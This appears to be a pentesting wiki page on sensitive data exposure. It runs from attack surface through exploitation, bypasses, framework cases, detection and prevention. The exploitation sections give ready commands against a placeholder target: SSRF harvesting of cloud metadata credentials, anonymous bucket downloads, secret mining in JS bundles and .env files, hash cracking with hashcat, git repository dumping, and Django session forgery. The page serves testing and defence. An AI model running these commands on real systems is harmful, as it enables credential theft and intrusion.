---
title: Sensitive Data Exposure
---

# Sensitive Data Exposure

Sensitive Data Exposure occurs when an application inadvertently reveals confidential information: credentials, PII, financial data, internal tokens, cryptographic keys, or infrastructure details to unauthorized parties. Unlike active exploitation attacks, many sensitive data exposures are **passive**: the data is simply there, unprotected, waiting to be read. It spans every layer of the stack from HTTP responses and JavaScript bundles to misconfigured cloud buckets and weak database encryption making it one of the broadest and most consistently impactful vulnerability classes in modern applications.

## Understanding Sensitive Data Exposure Basics

### The Exposure Triangle

Three root conditions produce the overwhelming majority of sensitive data exposures:

1. **Transmission Exposure:** Data sent over unencrypted or weakly encrypted channels HTTP instead of HTTPS, deprecated TLS, or cleartext internal service communication.
2. **Storage Exposure:** Data stored without encryption, with weak algorithms (MD5, SHA-1 unsalted), or in locations readable by unauthorized parties (public S3 buckets, world-readable files).
3. **Surfacing Exposure:** Data that is encrypted or protected in its canonical location but leaked through side channels error messages, API responses, JavaScript source, logs, headers, or backup files.

### Common Data Types Targeted

- **Authentication material:** Passwords (plaintext or weakly hashed), API keys, JWT secrets, OAuth tokens, session IDs.
- **PII:** Full names, email addresses, dates of birth, national ID numbers, passport scans.
- **Financial data:** Credit card numbers (PANs), CVVs, bank account numbers, transaction histories.
- **Infrastructure secrets:** Database connection strings, cloud provider credentials (`AWS_ACCESS_KEY_ID`), internal IP ranges, private TLS certificates.
- **Business-sensitive data:** Unreleased product data, internal pricing, employee records, M&A documents.

## Attack Surface

### API & Endpoint Leakage

- REST/GraphQL endpoints returning full object models with unexposed fields (mass assignment inverse over-fetching)
- Error responses embedding stack traces, SQL queries, or internal paths
- Debug endpoints left active in production (`/actuator`, `/debug`, `/_ah/admin`, `/trace`)
- API versioning drift old `/v1/` endpoints returning richer data than newer hardened `/v2/` equivalents
- Swagger/OpenAPI docs (`/swagger.json`, `/api-docs`, `/openapi.yaml`) publicly accessible and revealing internal endpoint structure

### Cloud Misconfigurations

- Public S3 / GCS / Azure Blob Storage buckets exposing backups, logs, or user uploads
- Overly permissive IAM policies attaching `s3:GetObject *` to unauthenticated principals
- Publicly accessible cloud metadata endpoints from SSRF (`http://169.254.169.254/latest/meta-data/`)
- Misconfigured Elasticsearch / Kibana / Grafana instances with no authentication exposed to the internet
- Cloud function environment variables (`process.env`) leaking secrets in error responses or verbose logging

### Cryptographic Failures

- Passwords stored as unsalted MD5 or SHA-1 hashes trivially cracked with rainbow tables
- Sensitive fields (SSN, card numbers) stored in plaintext in the database
- Symmetric encryption with hardcoded or reused IVs (ECB mode, static nonce in AES-GCM)
- Tokens and session IDs generated with weak PRNGs (`rand()`, `Math.random()`)
- Private keys stored in version control, world-readable config files, or backup archives

### Client-Side Exposure

- API keys, tokens, or credentials hardcoded in JavaScript bundles shipped to the browser
- Sensitive data persisted to `localStorage` or `sessionStorage` without encryption
- HTML comments containing developer notes, internal URLs, or credential placeholders
- Source maps (`.map` files) deployed to production exposes original source code of minified bundles
- Browser `autocomplete` enabled on sensitive form fields (passwords, card numbers, OTPs)

## Exploiting Sensitive Data Exposure

### 1. API Over-Fetching / Mass Object Exposure

APIs returning full internal object representations expose fields the UI never renders but the attacker can read directly.

```
GET /api/v1/users/me HTTP/1.1
Authorization: Bearer eyJhbGc...

HTTP/1.1 200 OK
{
  "id": 1042,
  "username": "alice",
  "email": "alice@example.com",
  "role": "user",
  "password_hash": "$2b$10$...",        ← should never be returned
  "api_key": "sk_live_9xKp...",         ← internal key exposed
  "2fa_backup_codes": ["839201", ...],  ← critical secret
  "stripe_customer_id": "cus_Abc123"
}
```

**Attack:** Directly query the endpoint with any valid session token. No privilege escalation required — the data is simply returned by default.

### 2. Verbose Error Messages — Stack Trace / Path Disclosure

Unhandled exceptions returned to the client reveal framework versions, internal file paths, database schemas, and connection strings.

```
POST /api/login HTTP/1.1
Content-Type: application/json
{"username": "' OR 1=1--", "password": "x"}

HTTP/1.1 500 Internal Server Error
{
  "error": "PG::SyntaxError: ERROR: syntax error at or near \"OR\"",
  "query": "SELECT * FROM users WHERE username='' OR 1=1--' AND password=...",
  "file": "/var/www/app/models/user.rb:42",
  "server": "Rails 5.2.1 / PostgreSQL 9.6.3"
}
```

### 3. Cloud Metadata SSRF — Credential Harvesting

If the application makes outbound HTTP requests with user-controlled URLs (SSRF), the cloud metadata endpoint leaks IAM credentials with production-level permissions.

```
# Trigger SSRF via a vulnerable URL-fetch parameter
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role HTTP/1.1

HTTP/1.1 200 OK
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUt...",
  "Token": "AQoXnyc...",
  "Expiration": "2026-03-23T18:00:00Z"
}
# These credentials grant whatever IAM permissions prod-role has — often S3/RDS/SQS access
```

### 4. Public Cloud Storage Enumeration

Misconfigured buckets expose entire data stores — backup archives, user uploads, internal logs — without authentication.

```bash
# Enumerate publicly accessible S3 bucket
aws s3 ls s3://target-company-backups --no-sign-request

# Output:
# 2024-11-01 03:12:44   2147483648 db_backup_prod_2024-11-01.sql.gz
# 2025-01-15 08:44:11    104857600 user_exports_Q4_2024.csv
# 2025-02-28 22:11:09      4096000 internal_api_keys.json

# Download directly
aws s3 cp s3://target-company-backups/internal_api_keys.json . --no-sign-request
```

```bash
# GCS equivalent
gsutil ls gs://target-company-prod/ -u anonymous

# Azure Blob (public container)
az storage blob list --account-name targetcompany --container-name backups --auth-mode anonymous
```

### 5. JavaScript Bundle Mining

Modern SPA builds bundle all application code into browser-deliverable JS files. Secrets hardcoded during development ship directly to users.

```bash
# Download and search all JS assets for secrets
curl -s https://target.com | grep -oP 'src="([^"]+\.js)"' | \
  xargs -I{} curl -s https://target.com/{} | \
  grep -iE "(api_key|apikey|secret|token|password|bearer|aws_access|private_key)\s*[=:]"

# Common findings:
# const API_KEY = "AIzaSy...";               ← Google API key
# Authorization: `Bearer ${STATIC_TOKEN}`    ← Hardcoded Bearer token
# aws_access_key_id: 'AKIA...'              ← AWS key in config object
```

```bash
# Check for exposed source maps (reveals original pre-minification source)
curl -I https://target.com/static/js/main.abc123.js.map
# HTTP 200 → download and reconstruct full source tree with source-map-cli
npx source-map-explorer main.abc123.js --map main.abc123.js.map
```

### 6. Cryptographic Failure: Weak Hash Cracking

Databases leaked or accessed via SQLi often contain password fields. Unsalted MD5/SHA-1 hashes are immediately reversible.

```bash
# Identify hash type from a leaked database record
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
# Result: MD5

# Crack against rockyou wordlist
hashcat -m 0 -a 0 5f4dcc3b5aa765d61d8327deb882cf99 /wordlists/rockyou.txt
# Cracked: 5f4dcc3b5aa765d61d8327deb882cf99 → "password"

# SHA-1 unsalted
hashcat -m 100 -a 0 <SHA1_hash> /wordlists/rockyou.txt

# bcrypt (properly salted) — orders of magnitude slower, often infeasible
hashcat -m 3200 -a 0 <bcrypt_hash> /wordlists/rockyou.txt
```

### 7. Git Repository & Backup File Exposure

Version control artifacts and editor backup files accidentally left on web servers expose full application source and embedded secrets. 

```bash
# Discover exposed .git directory
curl -s https://target.com/.git/HEAD
# Output: ref: refs/heads/main  ← .git is accessible

# Reconstruct repository using git-dumper
git-dumper https://target.com/.git/ ./recovered_repo

# Search recovered source for secrets
trufflehog filesystem ./recovered_repo --only-verified

# Common backup file patterns to check
for ext in .bak .old .backup .orig .swp ~; do
  curl -si "https://target.com/config.php${ext}" | grep -E "^HTTP|password|db_"
done
```

### 8. HTTP Response Header Leakage

Response headers routinely disclose server software, framework versions, internal infrastructure details, and session handling weaknesses.

```
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Ubuntu)              ← exact version → CVE lookup
X-Powered-By: PHP/7.4.3                     ← runtime version
X-AspNet-Version: 4.0.30319                 ← .NET version
X-Backend-Server: internal-app-01.corp      ← internal hostname
Set-Cookie: session=abc123; Path=/          ← no HttpOnly, no Secure, no SameSite
Via: 1.1 proxy-internal.corp (squid/4.6)   ← internal proxy details
```

## Bypasses & Obfuscation

### 1. Accessing Hidden API Fields via Parameter Manipulation

Some APIs filter response fields based on query parameters or headers — adding or modifying these exposes suppressed data.

```
# Standard request — returns filtered response
GET /api/v2/user/profile HTTP/1.1

# Add field expansion parameters
GET /api/v2/user/profile?fields=*  HTTP/1.1
GET /api/v2/user/profile?expand=all HTTP/1.1
GET /api/v2/user/profile?include=password_hash,api_key HTTP/1.1
GET /api/v2/user/profile?debug=true HTTP/1.1
```

### 2. Older API Version Regression

Newer API versions implement response filtering. Legacy endpoints remain active but return unredacted data.

```bash
# v2 — properly filtered
curl https://target.com/api/v2/orders/1042 -H "Authorization: Bearer <token>"
# → {"id":1042,"total":99.99,"status":"shipped"}

# v1 — original implementation, no filtering
curl https://target.com/api/v1/orders/1042 -H "Authorization: Bearer <token>"
# → {"id":1042,"total":99.99,"status":"shipped","card_last4":"4242",
#    "card_token":"tok_live_abc","billing_address":"123 Main St","cvv_attempt":"123"}
```

### 3. Forced Error State Triggering

Intentionally malformed requests trigger verbose exceptions that expose internal details not visible in normal operation.

```bash
# Send invalid data types to provoke detailed error responses
curl -X POST https://target.com/api/transfer \
  -H "Content-Type: application/json" \
  -d '{"amount": "not_a_number", "to_account": null}'

# Typical vulnerable response:
# TypeError: Cannot read properties of null (reading 'account_number')
#   at /app/services/TransferService.js:88:23
#   at processTicksAndRejections (node:internal/process/task_queues:95:5)
```

### 4. Cache / CDN Poisoning to Surface Private Responses

If a CDN caches responses that should be private (missing `Cache-Control: no-store, private`), an attacker can retrieve another user's sensitive response from cache.

```
GET /api/account/statement HTTP/1.1
Host: target.com
X-Forwarded-Host: target.com
# If the CDN key doesn't include Authorization header → cached private response
# served to next unauthenticated requester
```

## Test Cases

| Scenario | Payload / Action | Expected Outcome |
| --- | --- | --- |
| API Over-Fetching | `GET /api/v1/users/me` with low-priv token | Response contains password hashes, tokens, or internal IDs |
| Debug Endpoint Discovery | `GET /actuator/env`, `/debug/vars`, `/_ah/admin` | Internal config, env vars, or admin panel exposed |
| Public Bucket Enumeration | `aws s3 ls s3://target-name --no-sign-request` | Bucket contents listed without credentials |
| Cloud Metadata via SSRF | `GET /fetch?url=http://169.254.169.254/latest/meta-data/` | IAM role credentials returned in response |
| JS Bundle Secret Mining | `grep -iE "api_key | secret |
| Source Map Exposure | `curl -I https://target.com/app.js.map` | HTTP 200 → full source reconstruction possible |
| Git Directory Exposure | `curl https://target.com/.git/HEAD` | `ref: refs/heads/main` → repository dumpable |
| Verbose Error Triggering | Send malformed JSON / SQL chars to API | Stack trace, DB query, or file path returned |
| Weak Hash Identification | Extract hash from leaked DB; run `hash-identifier` | MD5/SHA-1 identified → cracked in seconds |
| Header Information Leakage | Inspect all response headers | `Server`, `X-Powered-By`, internal hostnames disclosed |
| Cookie Security Flags | Check `Set-Cookie` headers | Missing `HttpOnly`, `Secure`, or `SameSite` flags |
| Backup File Discovery | `curl https://target.com/config.php.bak` | Source code or credentials returned |
| Old API Version Regression | Compare `/v1/` vs `/v2/` same endpoint response | v1 returns unredacted sensitive fields |
| localStorage Secret Storage | Open DevTools → Application → localStorage | Tokens, user PII, or session data stored in plaintext |

## Framework-Specific Scenarios

### Spring Boot (Java) — Actuator Exposure

Spring Boot's Actuator endpoints expose application internals for monitoring. When left open in production without security config, they become a goldmine for attackers.

| Endpoint | Exposed Data | Risk |
| --- | --- | --- |
| `/actuator/env` | All environment variables including DB passwords, API keys | Critical |
| `/actuator/heapdump` | Full JVM heap dump — contains in-memory secrets, sessions | Critical |
| `/actuator/mappings` | All registered URL routes and controllers | High |
| `/actuator/beans` | Full Spring application context and bean definitions | High |
| `/actuator/logfile` | Application log file contents | High |
| `/actuator/httptrace` | Recent HTTP request/response history including headers | High |

```bash
# Discover and exploit exposed actuator
curl https://target.com/actuator/env | jq '.propertySources[].properties | to_entries[]
  | select(.key | test("password|secret|key|token"; "i"))'

# Heap dump extraction — contains raw memory including decrypted secrets
curl https://target.com/actuator/heapdump -o heap.hprof
# Analyze with Eclipse Memory Analyzer (MAT) → search for String objects matching secret patterns
strings heap.hprof | grep -iE "password|secret|apikey|Bearer"
```

### Django (Python) — Debug Mode & Secret Key Exposure

Django's `DEBUG=True` in production returns full exception pages with local variable state, settings values, and SQL queries.

```python
# settings.py misconfiguration — shipped to production
DEBUG = True
SECRET_KEY = 'django-insecure-hardcoded-key-abc123'  # ← default key not rotated
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'PASSWORD': 'prod_db_password_here',  # ← plaintext in source
    }
}
```

```
# Trigger Django debug page — any 500-causing request
GET /api/data?id=abc HTTP/1.1

# Response: Full Django debug page containing:
# - LOCAL VARS at every stack frame (including request.POST, session data)
# - Full SQL query that failed
# - Settings values (SECRET_KEY visible in INSTALLED_APPS context)
# - Absolute file paths of every module
```

```bash
# If SECRET_KEY is exposed → forge any Django session cookie
python3 -c "
import django.core.signing as signing
# With known SECRET_KEY, sign arbitrary session data
print(signing.dumps({'_auth_user_id': '1', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend'}, key='exposed-secret-key'))
"
```

### Laravel (PHP) — .env File & Debug Bar Exposure

Laravel stores all secrets in `.env`. Misconfigured deployments expose it directly; the Laravel Debugbar leaks request data in development mode left on in production.

```bash
# Direct .env file access — extremely common misconfiguration
curl https://target.com/.env

# Common response:
# APP_KEY=base64:abc123...
# DB_PASSWORD=SuperSecretProd123
# AWS_ACCESS_KEY_ID=AKIA...
# AWS_SECRET_ACCESS_KEY=wJalr...
# STRIPE_SECRET=sk_live_...
# MAIL_PASSWORD=smtp_pass_here
```

```bash
# Laravel Debugbar active in production — leaks all request data
curl https://target.com/api/users -H "Accept: application/json"
# Check response for X-Debug-Token header → fetch debug data
curl https://target.com/_debugbar/info?token=<X-Debug-Token-value>
# Returns: full SQL queries, session contents, request/response headers, app config
```

### Express.js / Node.js — Environment Variable Leakage

Node.js applications commonly expose `process.env` in error handlers or debug routes, leaking the entire environment including secrets injected at deploy time.

```jsx
// Vulnerable error handler — ships process.env to client
app.use((err, req, res, next) => {
    res.status(500).json({
        error: err.message,
        stack: err.stack,
        env: process.env  // ← all environment variables including secrets
    });
});

// Vulnerable debug route left active
app.get('/debug', (req, res) => {
    res.json({
        env: process.env,
        config: require('./config'),
        uptime: process.uptime()
    });
});
```

```bash
# Trigger the debug endpoint
curl https://target.com/debug | jq '.env | to_entries[]
  | select(.key | test("KEY|SECRET|PASSWORD|TOKEN"; "i"))'

# Or force the error handler
curl -X POST https://target.com/api/parse \
  -H "Content-Type: application/json" \
  -d 'INVALID_JSON_PAYLOAD'
```

### Ruby on Rails — Full Error Pages & Credential Leakage

Rails in development/staging mode returns rich exception pages via the `web-console` and `better_errors` gems, which are occasionally left active in production.

```bash
# better_errors gem active in production → interactive REPL in the browser
curl https://target.com/nonexistent-route
# Response: Full better_errors page with:
# - Live Ruby REPL in browser
# - All local variables at crash point
# - Application environment (Rails.application.credentials)

# Rails credentials file exposure (if master.key is committed to git)
cat config/master.key   # → decrypts config/credentials.yml.enc
rails credentials:show  # → reveals all secrets in plaintext
```

### GraphQL — Introspection & Over-fetching

GraphQL's introspection system, when left enabled in production, fully documents every type, field, query, and mutation — including sensitive internal fields never exposed in the UI.

```bash
# Full schema extraction via introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'

# Then query exposed sensitive fields directly
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { id email passwordHash apiKey internalNotes stripeToken } }"}'
```

```bash
# Automated GraphQL secret field discovery
graphql-cop -t https://target.com/graphql
# Checks for: introspection enabled, field suggestions, batching attacks, sensitive field names
```

## Detection Techniques

### Manual Detection

- **Response Body Auditing:** Intercept all API responses in Burp Suite and inspect for fields that shouldn't be client-visible: hashes, tokens, internal IDs, connection strings.
- **JS Bundle Inspection:** Download all `.js` assets and search for secret patterns using `grep`; use `source-map-explorer` if source maps are present.
- **Header Enumeration:** Review every response header for `Server`, `X-Powered-By`, `Via`, `X-Backend-Server`, and missing security headers (`X-Content-Type-Options`, `Referrer-Policy`).
- **Backup & Artifact Discovery:** Manually probe for `.env`, `.git/`, `config.php.bak`, `dump.sql`, `swagger.json`, `sitemap.xml`, `.DS_Store`, `.htpasswd`.
- **Error Triggering:** Send malformed inputs (wrong types, SQL metacharacters, oversized values, null bytes) to every endpoint and inspect error responses for stack traces.
- **Cloud Bucket Testing:** Attempt unauthenticated `LIST` and `GET` operations against guessed or discovered bucket names.

### Automated Detection

- **TruffleHog:** Scans git history, filesystems, and S3 buckets for verified secrets using entropy analysis and regex patterns.
    
    ```bash
    trufflehog git https://github.com/target/repo --only-verifiedtrufflehog s3 --bucket=target-company-backups
    ```
    
- **Gitleaks:** Fast git repository secret scanner; integrates into CI/CD pipelines as a pre-commit hook.
    
    ```bash
    gitleaks detect --source . --report-format json --report-path leaks.json
    ```
    
- **Nuclei (Exposure Templates):** Thousands of community templates detecting exposed `.env`, debug endpoints, backup files, cloud metadata, and framework-specific leaks.
    
    ```bash
    nuclei -u https://target.com -t exposures/ -t misconfiguration/ -severity critical,high
    ```
    
- **CloudSploit / Prowler:** Cloud-native misconfiguration scanners checking S3 ACLs, IAM policies, public RDS snapshots, and exposed storage across AWS/GCP/Azure.
    
    ```bash
    prowler aws --checks s3_bucket_public_access --output-formats json
    ```
    
- **Burp Suite Pro — Passive Scanner:** Automatically flags sensitive data patterns (credit card numbers, AWS keys, JWT tokens) appearing in response bodies and headers during manual browsing.
- **GitDorker / GitHub Dorks:** Searches GitHub for accidentally committed secrets in public repositories belonging to the target organization.
    
    ```bash
    python3 gitdorker.py -tf tokens.txt -q "org:target-company" -d dorks/secrets.txt
    ```
    

## Impact

- **Account Takeover at Scale:** Leaked password hashes cracked offline enable mass credential-stuffing campaigns against the target and third-party services (password reuse).
- **Full Infrastructure Compromise:** Exposed AWS/GCP keys with production IAM permissions grant attackers access to databases, object storage, compute instances, and billing controls.
- **Regulatory Penalties:** PCI-DSS, GDPR, HIPAA, and SOC 2 mandate protection of cardholder data, PII, and PHI — a single confirmed breach triggers mandatory disclosure and potential multi-million dollar fines.
- **Intellectual Property Theft:** Source code reconstruction from `.map` files or `.git` exposure reveals proprietary business logic, internal API structure, and unreleased features.
- **Supply Chain Attacks:** Leaked CI/CD tokens or NPM/PyPI credentials allow attackers to inject malicious code into package releases affecting all downstream consumers.
- **Silent Long-Term Surveillance:** Unlike active attacks, data exposure is often silent — attackers silently exfiltrate data over months before detection.
- **Identity Fraud:** PII exposure (SSNs, passport numbers, DOBs) enables downstream identity theft, loan fraud, and social engineering attacks against victims.

## Prevention Techniques

- **Classify Data Before Building:** Maintain a data inventory. Every sensitive field must have a documented storage format (encrypted, hashed, tokenized) and access policy before development begins.
- **Never Return What You Don't Need:** API responses should be built from explicit allow-lists of fields, never serialized directly from ORM models. Apply the principle of minimal disclosure.
- **Use Strong, Salted Hashing for Passwords:** Use `bcrypt` (cost ≥ 12), `Argon2id`, or `scrypt` exclusively. Never use MD5, SHA-1, SHA-256, or unsalted hashes for passwords.
- **Encrypt Sensitive Fields at Rest:** Use AES-256-GCM for field-level encryption of PII, financial data, and secrets stored in databases. Manage keys separately from data (AWS KMS, HashiCorp Vault).
- **Secrets Management — Never Hardcode:** All credentials, API keys, and tokens must be injected at runtime via a secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager) — never in source code, `.env` files committed to git, or environment variable dumps.
- **Disable Debug Modes in Production:** Enforce `DEBUG=False` (Django), `config.debug = false` (Express), `RAILS_ENV=production` — validated via automated CI/CD checks.
- **Restrict Cloud Storage ACLs:** All S3/GCS/Azure buckets must default to private. Enable Block Public Access settings at the account level and enforce via SCP/Organization Policy.
- **Disable GraphQL Introspection in Production:** Set `introspection: false` and implement field-level authorization on every resolver — not just at the query entry point.
- **Set Secure Cookie Flags:** All session cookies must have `HttpOnly`, `Secure`, and `SameSite=Strict` or `SameSite=Lax` flags set unconditionally.
- **Remove Source Maps from Production Builds:** Configure webpack/Vite/Rollup to suppress `.map` file generation in production builds; if needed for internal debugging, serve them behind authentication.
- **Implement Security Headers:** Deploy `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff`, `Cache-Control: no-store` on all sensitive API responses, `Permissions-Policy`, and `Content-Security-Policy`.
- **Rotate Exposed Secrets Immediately:** Treat any credential found in a scan or report as fully compromised — rotate it immediately, audit access logs for prior use, and investigate the exposure window.

## Tools

| Tool | Purpose | Link |
| --- | --- | --- |
| `TruffleHog` | Secret scanning in git, S3, filesystems | https://github.com/trufflesecurity/trufflehog |
| `Gitleaks` | Fast git secret scanner, CI/CD integration | https://github.com/gitleaks/gitleaks |
| `Nuclei` | Template-based exposure & misconfiguration scanning | https://github.com/projectdiscovery/nuclei |
| `Prowler` | AWS/GCP/Azure cloud misconfiguration auditor | https://github.com/prowler-cloud/prowler |
| `CloudSploit` | Cloud security scanning across providers | https://github.com/aquasecurity/cloudsploit |
| `GraphQL Cop` | GraphQL security misconfiguration tester | https://github.com/dolevf/graphql-cop |
| `git-dumper` | Reconstruct git repos from exposed `.git/` | https://github.com/arthaud/git-dumper |
| `source-map-explorer` | Reconstruct source from JS source maps | https://github.com/danvk/source-map-explorer |
| `Burp Suite Pro` | HTTP interception, passive/active scanning | https://portswigger.net/burp |
| `Hashcat` | GPU-accelerated hash cracking | https://hashcat.net |
| `hash-identifier` | Identify hash algorithm from sample | https://github.com/blackploit/hash-identifier |
| `GitDorker` | GitHub dork-based secret discovery | https://github.com/obheda12/GitDorker |
| `ffuf` | Fast fuzzing for backup files and hidden endpoints | https://github.com/ffuf/ffuf |
| `AWS CLI` | Direct cloud storage enumeration | https://aws.amazon.com/cli/ |

## Good To Read

### HackerOne Reports

- [**Sensitive Data Exposure - US DoD**](https://hackerone.com/reports/1278977)
- [**Shopify (#1087489):** Github access token exposure.](https://hackerone.com/reports/1087489)
- [**Bulk UUID enumeration via invite codes**](https://hackerone.com/reports/145150)
- [**H1514 Extract information about other sites (new sites) through Affiliate/Referral pages**](https://hackerone.com/reports/423506)

### Writeups

- [The Full Uber Hack Writeup — Credential Exposure Chain (2022)](https://www.uber.com/newsroom/security-update)
- [Detectify Blog — How we found AWS Keys on GitHub for fun and profit](https://detectify.com/)
- [GitGuardian State of Secrets Sprawl Annual Report](https://www.gitguardian.com/state-of-secrets-sprawl)

## References

- [OWASP Top 10: A02:2021 — Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [OWASP API Security Top 10: API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP Testing Guide: WSTG-CRYP-04 — Testing for Weak Encryption](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [NIST SP 800-57 — Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)
- [CWE-916: Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)
- [AWS S3 Block Public Access Documentation](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html)
- [PortSwigger: Information Disclosure Vulnerabilities](https://portswigger.net/web-security/information-disclosure)
- [HaveIBeenPwned: Understanding Credential Exposure at Scale](https://haveibeenpwned.com/)